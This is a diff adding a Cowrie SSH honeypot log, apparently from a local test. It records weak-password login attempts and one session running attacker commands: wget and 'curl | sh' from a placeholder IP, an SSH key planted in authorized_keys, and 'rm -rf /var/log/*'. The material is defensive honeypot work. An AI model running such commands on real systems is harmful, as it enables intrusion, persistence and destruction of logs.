@@ -1,0 +1,93 @@
+2026-09-20T14:24:37.298567Z [cowrie.core.config#info] Reading configuration from ['etc/cowrie.cfg']
+2026-09-20T14:24:37.757488Z [cowrie.plugin#info] Python Version 3.12.14 (main, Sep  1 2026, 14:16:52) [Clang 22.1.3 ]
+2026-09-20T14:24:37.757522Z [cowrie.plugin#info] Twisted Version 26.4.0
+2026-09-20T14:24:37.757531Z [cowrie.plugin#info] Cowrie Version 0.1.dev1+gddd97e970
+2026-09-20T14:24:37.757536Z [cowrie.plugin#info] Sensor UUID: 3f026ba8-b4ee-11f1-b9b8-bd90d407203d
+2026-09-20T14:24:37.759003Z [cowrie.core.output#info] Loaded output engine: jsonlog
+2026-09-20T14:24:37.759932Z [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 26.4.0 (/home/rewan/cowrie/cowrie-env/bin/python 3.12.14) starting up.
+2026-09-20T14:24:37.759969Z [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
+2026-09-20T14:24:37.765030Z [-] CowrieSSHFactory starting on 2222
+2026-09-20T14:24:37.765618Z [cowrie.ssh.factory.CowrieSSHFactory#info] Starting factory <cowrie.ssh.factory.CowrieSSHFactory object at 0x75efe4c2daf0>
+2026-09-20T14:24:37.830514Z [cowrie.ssh.factory.CowrieSSHFactory#info] Ready to accept SSH connections
+2026-09-20T14:25:12.018681Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
+2026-09-20T14:25:12.018911Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
+2026-09-20T14:25:12.019492Z [ssh,0339289b5a4c,127.0.0.1] New connection: 127.0.0.1:39652 (127.0.0.1:2222) [session: 0339289b5a4c]
+2026-09-20T14:25:12.019842Z [ssh,0339289b5a4c,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T14:25:12.021472Z [ssh,0339289b5a4c,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T14:25:12.087283Z [ssh,0339289b5a4c,127.0.0.1] login attempt [admin/admin] succeeded
+2026-09-20T14:25:12.087476Z [HoneyPotSSHTransport,0,127.0.0.1] Initialized emulated server as architecture: linux-x64-lsb
+2026-09-20T14:25:12.089858Z [HoneyPotSSHTransport,0,127.0.0.1] channel open
+2026-09-20T14:25:12.214992Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] Executing command "b'uname -a'"
+2026-09-20T14:25:12.216253Z [ssh,0339289b5a4c,127.0.0.1] CMD: uname -a
+2026-09-20T14:25:12.218792Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] Command found: uname -a
+2026-09-20T14:25:12.219375Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] exitCode: 0
+2026-09-20T14:25:12.219533Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,127.0.0.1] sending close 0
+2026-09-20T14:25:12.220628Z [HoneyPotSSHTransport,0,127.0.0.1] received eof, logging out
+2026-09-20T14:25:12.220859Z [HoneyPotSSHTransport,0,127.0.0.1] exitCode: 0
+2026-09-20T14:25:12.221430Z [ssh,0339289b5a4c,127.0.0.1] Closing TTY Log: var/lib/cowrie/tty/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15 after 6 milliseconds
+2026-09-20T14:25:12.221700Z [HoneyPotSSHTransport,0,127.0.0.1] remote close
+2026-09-20T14:25:12.275889Z [HoneyPotSSHTransport,0,127.0.0.1] avatar admin logging out
+2026-09-20T14:25:12.276097Z [HoneyPotSSHTransport,0,127.0.0.1] connection lost
+2026-09-20T14:25:12.276243Z [ssh,0339289b5a4c,127.0.0.1] Connection lost after 257 milliseconds
+2026-09-20T14:25:33.520112Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
+2026-09-20T14:25:33.520366Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
+2026-09-20T14:25:33.520792Z [ssh,15d5cb2e3f78,127.0.0.1] New connection: 127.0.0.1:46702 (127.0.0.1:2222) [session: 15d5cb2e3f78]
+2026-09-20T14:25:33.521144Z [ssh,15d5cb2e3f78,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T14:25:33.522753Z [ssh,15d5cb2e3f78,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T14:25:33.571053Z [ssh,15d5cb2e3f78,127.0.0.1] login attempt [root/root] failed
+2026-09-20T14:25:34.576848Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
+2026-09-20T14:25:34.577166Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
+2026-09-20T14:25:34.577687Z [ssh,0ac981480651,127.0.0.1] New connection: 127.0.0.1:46710 (127.0.0.1:2222) [session: 0ac981480651]
+2026-09-20T14:25:34.578174Z [ssh,0ac981480651,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T14:25:34.580689Z [ssh,0ac981480651,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T14:25:34.629982Z [ssh,0ac981480651,127.0.0.1] login attempt [root/123456] failed
+2026-09-20T14:25:35.634426Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
+2026-09-20T14:25:35.634740Z [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
+2026-09-20T14:25:35.635270Z [ssh,19f15e09872b,127.0.0.1] New connection: 127.0.0.1:46712 (127.0.0.1:2222) [session: 19f15e09872b]
+2026-09-20T14:25:35.635765Z [ssh,19f15e09872b,127.0.0.1] Remote SSH version: SSH-2.0-paramiko_5.0.0
+2026-09-20T14:25:35.638709Z [ssh,19f15e09872b,127.0.0.1] SSH client hassh fingerprint: 6372ee6957562199b2fb773b0be1bf34
+2026-09-20T14:25:35.685215Z [ssh,19f15e09872b,127.0.0.1] login attempt [root/password] succeeded
+2026-09-20T14:25:35.685546Z [HoneyPotSSHTransport,3,127.0.0.1] Initialized emulated server as architecture: linux-x64-lsb
+2026-09-20T14:25:35.686699Z [HoneyPotSSHTransport,3,127.0.0.1] channel open
+2026-09-20T14:25:35.688162Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,3,127.0.0.1] Handling pty request: b'vt100' (24, 80, 0, 0)
+2026-09-20T14:25:35.688379Z [ssh,19f15e09872b,127.0.0.1] Terminal Size: 80 24
+2026-09-20T14:25:35.689000Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,3,127.0.0.1] Getting shell
+2026-09-20T14:25:36.692450Z [ssh,19f15e09872b,127.0.0.1] CMD: uname -a
+2026-09-20T14:25:36.698337Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: uname -a
+2026-09-20T14:25:38.193193Z [ssh,19f15e09872b,127.0.0.1] CMD: whoami
+2026-09-20T14:25:38.196626Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: whoami 
+2026-09-20T14:25:39.693027Z [ssh,19f15e09872b,127.0.0.1] CMD: cat /etc/passwd
+2026-09-20T14:25:39.695131Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: cat /etc/passwd
+2026-09-20T14:25:41.195396Z [ssh,19f15e09872b,127.0.0.1] CMD: ls -la /root
+2026-09-20T14:25:41.201224Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: ls -la /root
+2026-09-20T14:25:42.696237Z [ssh,19f15e09872b,127.0.0.1] CMD: wget http://203.0.113.5/bot.sh -O /tmp/bot.sh
+2026-09-20T14:25:42.701496Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: wget http://203.0.113.5/bot.sh -O /tmp/bot.sh
+2026-09-20T14:25:42.702251Z [HoneyPotSSHTransport,3,127.0.0.1] Attempt to access blocked network address
+2026-09-20T14:25:44.195222Z [ssh,19f15e09872b,127.0.0.1] CMD: chmod +x /tmp/bot.sh
+2026-09-20T14:25:44.197785Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: chmod +x /tmp/bot.sh
+2026-09-20T14:25:45.698675Z [ssh,19f15e09872b,127.0.0.1] CMD: echo 'ssh-rsa AAAAB3Nza attacker@evil' >> ~/.ssh/authorized_keys
+2026-09-20T14:25:45.705348Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: echo ssh-rsa AAAAB3Nza attacker@evil
+2026-09-20T14:25:47.199604Z [ssh,19f15e09872b,127.0.0.1] CMD: curl -s http://203.0.113.5/x | sh
+2026-09-20T14:25:47.207781Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: curl -s http://203.0.113.5/x
+2026-09-20T14:25:47.208405Z [HoneyPotSSHTransport,3,127.0.0.1] Attempt to access blocked network address
+2026-09-20T14:25:47.208658Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: sh 
+2026-09-20T14:25:48.699323Z [ssh,19f15e09872b,127.0.0.1] CMD: rm -rf /var/log/*
+2026-09-20T14:25:48.707331Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: rm -rf /var/log/*
+2026-09-20T14:25:50.199227Z [ssh,19f15e09872b,127.0.0.1] CMD: exit
+2026-09-20T14:25:50.201260Z [HoneyPotSSHTransport,3,127.0.0.1] Command found: exit 
+2026-09-20T14:25:50.201560Z [HoneyPotSSHTransport,3,127.0.0.1] exitCode: 0
+2026-09-20T14:25:50.201931Z [ssh,19f15e09872b,127.0.0.1] Closing TTY Log: var/lib/cowrie/tty/3a55160f4af4cf99f3e91f911638a78a93c1110f6fd125bcbee5afde58c00487 after 14513 milliseconds
+2026-09-20T14:25:50.202015Z [HoneyPotSSHTransport,3,127.0.0.1] sending close 0
+2026-09-20T14:25:50.246696Z [HoneyPotSSHTransport,3,127.0.0.1] remote close
+2026-09-20T14:25:51.710972Z [HoneyPotSSHTransport,3,127.0.0.1] avatar root logging out
+2026-09-20T14:25:51.711263Z [HoneyPotSSHTransport,3,127.0.0.1] connection lost
+2026-09-20T14:25:51.711468Z [ssh,19f15e09872b,127.0.0.1] Connection lost after 16076 milliseconds
+2026-09-20T14:25:51.713067Z [HoneyPotSSHTransport,2,127.0.0.1] connection lost
+2026-09-20T14:25:51.713289Z [ssh,0ac981480651,127.0.0.1] Connection lost after 17135 milliseconds
+2026-09-20T14:25:51.737383Z [HoneyPotSSHTransport,1,127.0.0.1] connection lost
+2026-09-20T14:25:51.737688Z [ssh,15d5cb2e3f78,127.0.0.1] Connection lost after 18217 milliseconds
+2026-09-20T14:25:59.044858Z [twisted.internet.base#info] Received SIGTERM, shutting down.
+2026-09-20T14:25:59.045449Z [-] (TCP Port 2222 Closed)
+2026-09-20T14:25:59.045691Z [cowrie.ssh.factory.CowrieSSHFactory#info] Stopping factory <cowrie.ssh.factory.CowrieSSHFactory object at 0x75efe4c2daf0>
+2026-09-20T14:25:59.045975Z [twisted.internet.base#info] Main loop terminated.
+2026-09-20T14:25:59.046370Z [twisted.scripts._twistd_unix.UnixAppLogger#info] Server Shut Down.
